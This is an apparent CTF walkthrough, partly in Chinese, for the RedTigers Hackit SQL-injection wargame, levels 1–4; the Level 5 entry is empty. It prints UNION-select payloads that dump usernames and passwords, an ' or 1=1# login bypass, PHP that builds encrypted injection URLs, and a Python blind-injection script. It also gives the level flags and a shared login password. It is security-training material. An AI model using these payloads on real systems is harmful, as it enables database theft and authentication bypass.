# SQL Practice@[RedTigers Hackit](http://redtiger.labs.overthewire.org)

## Level 1

1.  确定列数: `?cat=1 order by 5`
2.  确定显示位置:　`?cat=0 union select 1,2,3,4 from level1_users`
3.  Get: `?cat=0 union select 1,2,username,password from level1_users`
4.  flag: `27cbddc803ecde822d87a7e8639f9315`

## Level 2

1.  `' or 1=1#`
2.  flag: `1222e2d4ad5da677efb188550528bfaa`

## Level 3

> Target: Get the password of the user Admin.
> Hint: Try to get an error. Tablename: level3_users

1.  构造错误: `level3.php?usr[]=MTI5MTY0MTczMTY5MTc0`
    > Show userdetails:
    > Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21
2.  [urlcrypt.inc](./level_3/urlcrypt.inc)
3.  得到两个函数，encrypt和decrypt分别用来解密和加密
4.  构造PHP语句，确定列数:
    ```php
    $url='http://redtiger.labs.overthewire.org/level3.php?usr=';
    $order='admin\'order by 7 #';
    $order=encrypt($order);
    echo "$url$order <br>";
    $url='http://redtiger.labs.overthewire.org/level3.php?usr=';
    $order='admin\'order by 8 #';
    $order=encrypt($order);
    echo "$url$order <br>";
    ```
5.  构造PHP语句，拿到flag:
    ```php
    $url='http://redtiger.labs.overthewire.org/level3.php?usr=';
    $order='\' union select 1,username,3,password,5,6,7 from level3_users where username=\'admin\' #';
    $order=encrypt($order);
    echo "$url$order <br>";
    ```
6.  flag: a707b245a60d570d25a0449c2a516eca

## Level 4

>  Target: Get the value of the first entry in table level4_secret in column keyword
>
>  Disabled: like

1.  判断目标长度: `?id=1 and length(keyword)=17`

2.  猜测目标内容：`?id=1 and ASCII(SUBSTR(keyword,1,1))=0`

3.  自动化猜测：

        ```python

    import requests
    def search(p,l,r):
        if l > r:
            return False
        x=(l+r) // 2
        re=s.post(url+order % (p,'=',x),data = login)
        if '1 rows.' in re.text:
            return chr(x)
        re=s.post(url+order % (p,'>',x),data = login)
        if '1 rows.' in re.text:
            return search(p,x+1,r)
        else:
            return search(p,l,x-1)
    s = requests.Session()
    login = {'password': 'dont_publish_solutions_GRR!',
             'level4login': 'Login'}
    url='<http://redtiger.labs.overthewire.org/level4.php>'
    order='?id=1 and length(keyword)>'
    i=16
    while i &lt; 32767:
        re=s.post(url+order+str(i),data = login)
        if '0 rows.' in re.text:
            length=i
            break
        i=i+1
    print 'length=',length
    keyword=''
    order='?id=1 and ASCII(SUBSTR(keyword,%d,1))%s%d'
    for i in range(1,length+1):
        keyword=keyword+search(i,32,126)
        print i,'/',length,keyword
    print 'keyword=',keyword

        	```

4.  flag: `e8bcb79c389f5e295bac81fda9fd7cfa`

## Level 5

1.
